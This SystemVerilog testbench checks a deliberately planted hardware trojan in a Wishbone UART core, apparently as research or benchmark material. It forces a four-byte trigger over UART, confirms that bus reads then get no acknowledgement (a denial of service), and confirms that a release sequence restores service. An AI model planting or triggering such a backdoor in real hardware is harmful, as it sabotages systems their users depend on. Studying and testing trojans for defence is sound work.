`timescale 1ns/1ps

module tb_wbuart_trojan;
	localparam integer WB_ADDR_SETUP = 2'b00;
	localparam integer CLOCKS_PER_BAUD = 868;
	localparam integer WB_TIMEOUT_CYCLES = 4000;

	reg		clk = 1'b0;
	reg		reset = 1'b1;

	always #5 clk = ~clk; // 100MHz clock

	initial begin
		uart_rx = 1'b1; // Idle line state
		wb_cyc = 1'b0;
		wb_stb = 1'b0;
		wb_we  = 1'b0;
		wb_addr = 2'b00;
		wb_data = 32'h0;
		wb_sel  = 4'hf;
		repeat (5) @(posedge clk);
		reset = 1'b0;
	end

	// Wishbone interface signals
	reg		wb_cyc;
	reg		wb_stb;
	reg		wb_we;
	reg	[1:0]	wb_addr;
	reg	[31:0]	wb_data;
	reg	[3:0]	wb_sel;
	wire		o_wb_stall;
	wire		o_wb_ack;
	wire	[31:0]	o_wb_data;

	// UART signals
	reg		uart_rx;
	wire		uart_tx;

	wire		o_rts_n;
	wire		uart_rx_int, uart_tx_int, uart_rx_fifo_int, uart_tx_fifo_int;

	wbuart #(
		.INITIAL_SETUP(31'd868),
		.HARDWARE_FLOW_CONTROL_PRESENT(1'b0)
	) dut (
		.i_clk(clk),
		.i_reset(reset),
		.i_wb_cyc(wb_cyc),
		.i_wb_stb(wb_stb),
		.i_wb_we(wb_we),
		.i_wb_addr(wb_addr),
		.i_wb_data(wb_data),
		.i_wb_sel(wb_sel),
		.o_wb_stall(o_wb_stall),
		.o_wb_ack(o_wb_ack),
		.o_wb_data(o_wb_data),
		.i_uart_rx(uart_rx),
		.o_uart_tx(uart_tx),
		.i_cts_n(1'b1),
		.o_rts_n(o_rts_n),
		.o_uart_rx_int(uart_rx_int),
		.o_uart_tx_int(uart_tx_int),
		.o_uart_rxfifo_int(uart_rx_fifo_int),
		.o_uart_txfifo_int(uart_tx_fifo_int)
	);

	always @(posedge clk)
	if (dut.rx_stb)
		$display("[TB] RX byte=0x%02x at time %0t", dut.rx_uart_data, $time);

	// UART stimulus
	task automatic send_uart_byte(input [7:0] value);
		integer i;
		begin
			uart_rx = 1'b0; // Start bit
			repeat (CLOCKS_PER_BAUD+2) @(posedge clk);
			for (i = 0; i < 8; i = i + 1) begin
				uart_rx = value[i];
				repeat (CLOCKS_PER_BAUD+2) @(posedge clk);
			end
			uart_rx = 1'b1; // Stop bit
			repeat (CLOCKS_PER_BAUD+2) @(posedge clk);
		end
	endtask

	task inject_rx_byte(input [7:0] value);
		begin
			force dut.rx_uart_data = value;
			force dut.rx_stb = 1'b1;
			@(posedge clk);
			@(posedge clk);
			release dut.rx_stb;
			release dut.rx_uart_data;
			@(posedge clk);
			$display("[TB] Injected byte 0x%02x", value);
		end
	endtask

	task automatic wb_start_read(input [1:0] addr);
		begin
			wb_addr = addr;
			wb_we  = 1'b0;
			wb_data = 32'h0;
			wb_cyc = 1'b1;
			wb_stb = 1'b1;
		end
	endtask

	task automatic wb_stop;
		begin
			wb_cyc = 1'b0;
			wb_stb = 1'b0;
			wb_we  = 1'b0;
		end
	endtask

	task automatic wb_wait_ack(output bit got_ack, output integer cycles_waited, input integer limit);
		integer i;
		begin
			got_ack = 1'b0;
			cycles_waited = 0;
			for (i = 0; (i < limit) && (!got_ack); i = i + 1) begin
				@(posedge clk);
				cycles_waited = cycles_waited + 1;
				if (o_wb_ack) begin
					got_ack = 1'b1;
				end
			end
		end
	endtask

	initial begin : test_sequence
		real start_time;
		bit acked;
		integer cycles;
		@(negedge reset);
		repeat (CLOCKS_PER_BAUD) @(posedge clk);

		$display("[TB] Performing baseline Wishbone read");
		wb_start_read(WB_ADDR_SETUP);
		wb_wait_ack(acked, cycles, WB_TIMEOUT_CYCLES);
		if (!acked) begin
			$fatal(1, "Baseline Wishbone read did not receive ACK");
		end
		$display("[TB] Baseline ACK received after %0d cycles", cycles);
		wb_stop();
		@(posedge clk);

		$display("[TB] Sending trigger sequence");
		repeat (CLOCKS_PER_BAUD) @(posedge clk);
		inject_rx_byte(8'h10);
		inject_rx_byte(8'ha4);
		inject_rx_byte(8'h98);
		inject_rx_byte(8'hbd);

		repeat (CLOCKS_PER_BAUD) @(posedge clk);
		$display("[TB] trojan_dos_active=%0d history=0x%08x", dut.trojan_dos_active, dut.trojan_history);

		$display("[TB] Testing Wishbone access during DoS");
		wb_start_read(WB_ADDR_SETUP);
		wb_wait_ack(acked, cycles, WB_TIMEOUT_CYCLES);
		if (acked) begin
			$fatal(2, "Trojan failed: ACK observed during supposed DoS window");
		end else begin
			$display("[TB] No ACK observed over %0d cycles as expected", cycles);
		end
		wb_stop();
		@(posedge clk);

		$display("[TB] Sending release sequence");
		inject_rx_byte(8'hfe);
		inject_rx_byte(8'hfe);
		inject_rx_byte(8'hfe);
		inject_rx_byte(8'hfe);

		repeat (CLOCKS_PER_BAUD) @(posedge clk);

		$display("[TB] Retesting Wishbone access after release");
		wb_start_read(WB_ADDR_SETUP);
		wb_wait_ack(acked, cycles, WB_TIMEOUT_CYCLES);
		if (!acked) begin
			$fatal(3, "Trojan release failed: ACK not restored");
		end else begin
			$display("[TB] ACK restored after %0d cycles", cycles);
		end
		wb_stop();
		@(posedge clk);

		$display("[TB] Test completed successfully");
		#100;
		$finish;
	end

endmodule
